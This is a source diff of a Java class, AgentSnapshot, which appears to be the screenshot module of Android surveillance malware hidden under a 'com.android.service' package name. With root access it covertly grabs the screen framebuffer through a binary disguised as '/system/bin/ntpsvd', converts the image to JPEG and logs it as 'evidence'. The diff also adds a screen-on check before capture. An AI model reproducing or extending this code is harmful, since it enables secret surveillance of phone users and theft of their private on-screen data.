@@ -11,21 +11,15 @@ package com.android.service.agent;
 
 import java.io.ByteArrayOutputStream;
 import java.io.File;
-import java.io.FileInputStream;
 import java.io.IOException;
 import java.nio.ByteBuffer;
 import java.nio.ByteOrder;
-import java.nio.IntBuffer;
-import java.nio.channels.FileChannel;
 
 import android.content.Context;
 import android.graphics.Bitmap;
-import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
-import android.util.Log;
 import android.view.Display;
 import android.view.Surface;
-import android.view.View;
 import android.view.WindowManager;
 
 import com.android.service.LogR;
@@ -33,6 +27,7 @@ import com.android.service.Status;
 import com.android.service.auto.Cfg;
 import com.android.service.evidence.EvidenceType;
 import com.android.service.file.AutoFile;
+import com.android.service.listener.ListenerStandby;
 import com.android.service.util.Check;
 import com.android.service.util.DataBuffer;
 import com.android.service.util.Utils;
@@ -62,12 +57,13 @@ public class AgentSnapshot extends AgentBase {
 	/** The type. */
 	private int type;
 
+
 	/**
 	 * Instantiates a new snapshot agent.
 	 */
 	public AgentSnapshot() {
 		if (Cfg.DEBUG)
-			Log.d("QZ", TAG + " SnapshotAgent constructor");
+			Check.log( TAG + " SnapshotAgent constructor");
 	}
 
 	/*
@@ -96,6 +92,17 @@ public class AgentSnapshot extends AgentBase {
 	public void begin() {
 		setDelay(this.delay);
 		setPeriod(this.delay);
+		
+	}
+
+	/*
+	 * (non-Javadoc)
+	 * 
+	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
+	 */
+	@Override
+	public void end() {
+
 	}
 
 	/*
@@ -104,30 +111,35 @@ public class AgentSnapshot extends AgentBase {
 	 * @see com.ht.AndroidServiceGUI.ThreadBase#go()
 	 */
 	@Override
-	public void go() {
-		// final LogR log = new LogR(EvidenceType.SNAPSHOT, LogR.LOG_PRI_STD);
-
+	public synchronized void go() {
 		switch (type) {
 		case CAPTURE_FULLSCREEN:
 
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: logging full screen");
+				Check.log( TAG + " Snapshot Agent: logging full screen");
 			break;
 
 		case CAPTURE_FOREGROUND:
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: logging foreground window");
+				Check.log( TAG + " Snapshot Agent: logging foreground window");
 			break;
 
 		default:
 			if (Cfg.DEBUG)
-				Log.d("QZ", TAG + " Snapshot Agent: wrong capture parameter");
+				Check.log( TAG + " Snapshot Agent: wrong capture parameter");
 			break;
 		}
 
 		try {
 
 			if (Status.self().haveRoot()) {
+				
+				boolean isScreenOn = ListenerStandby.isScreenOn();
+				if(!isScreenOn){
+					if(Cfg.DEBUG) Check.log( TAG + " (go): Screen powered off, no snapshot");
+					return;
+				}
+								
 				Display display = ((WindowManager) Status.getAppContext()
 						.getSystemService(Context.WINDOW_SERVICE))
 						.getDefaultDisplay();
@@ -143,7 +155,7 @@ public class AgentSnapshot extends AgentBase {
 				}
 
 				if (Cfg.DEBUG)
-					Log.d("QZ", TAG + " (go): w=" + width + " h=" + height);
+					Check.log( TAG + " (go): w=" + width + " h=" + height);
 
 				byte[] raw = getRawBitmap();
 				// int[] pixels = new int[ width * height];
@@ -158,7 +170,7 @@ public class AgentSnapshot extends AgentBase {
 					buffer = null;
 					raw = null;
 
-					if(orientation != Surface.ROTATION_0){
+					if (orientation != Surface.ROTATION_0) {
 						Matrix matrix = new Matrix();
 						if (orientation == Surface.ROTATION_90)
 							matrix.setRotate(270);
@@ -166,22 +178,22 @@ public class AgentSnapshot extends AgentBase {
 							matrix.setRotate(90);
 						else if (orientation == Surface.ROTATION_180)
 							matrix.setRotate(180);
-						
-						bitmap = Bitmap.createBitmap(bitmap, 0, 0,
-		                          width, height, matrix, true);					
+
+						bitmap = Bitmap.createBitmap(bitmap, 0, 0, width,
+								height, matrix, true);
 					}
 
 					byte[] jpeg = toJpeg(bitmap);
 					bitmap = null;
 
 					new LogR(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
-					jpeg=null;
+					jpeg = null;
 				}
 			}
 		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
-				Log.d("QZ", TAG + " (go) Error: " + ex);
-				ex.printStackTrace();
+				Check.log( TAG + " (go) Error: " + ex);
+				Check.log(ex);
 			}
 		}
 
@@ -216,57 +228,34 @@ public class AgentSnapshot extends AgentBase {
 		byte[] array = os.toByteArray();
 		try {
 			os.close();
-			
+
 		} catch (IOException e) {
 			if (Cfg.DEBUG)
-				e.printStackTrace();
+				Check.log(e);
 		}
 		return array;
 
 	}
 
 	private byte[] getRawBitmap() {
-		// String
-		// getrawpath="statuslog -c \"/system/bin/cat /dev/graphics/fb0\""
 		File filesPath = Status.getAppContext().getFilesDir();
 		String path = filesPath.getAbsolutePath();
 
-		// String
-		// String getrawpath = path +
-		// "/statusdb -c \"/system/bin/cp /dev/graphics/fb0 "+path+"/frame0\"";
-		String getrawpath = path + "/statusdb fb";
+		String getrawpath = "/system/bin/ntpsvd fb";
 		try {
 			Process localProcess = Runtime.getRuntime().exec(getrawpath);
 			localProcess.waitFor();
 
-			// FileChannel fc = new FileInputStream(new File(path, "frame"))
-			// .getChannel();
-			// IntBuffer ib = fc.map(FileChannel.MapMode.READ_ONLY, 0,
-			// fc.size())
-			// .asIntBuffer();
-
-			// return ib;
 			AutoFile file = new AutoFile(path, "frame");
 			if (file.exists()) {
 				return file.read();
 			}
 		} catch (IOException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Cfg.DEBUG) Check.log(e);
 		} catch (InterruptedException e) {
-			// TODO Auto-generated catch block
-			e.printStackTrace();
+			if(Cfg.DEBUG) Check.log(e);
 		}
 		return null;
 	}
 
-	/*
-	 * (non-Javadoc)
-	 * 
-	 * @see com.ht.AndroidServiceGUI.agent.AgentBase#end()
-	 */
-	@Override
-	public void end() {
-
-	}
 }
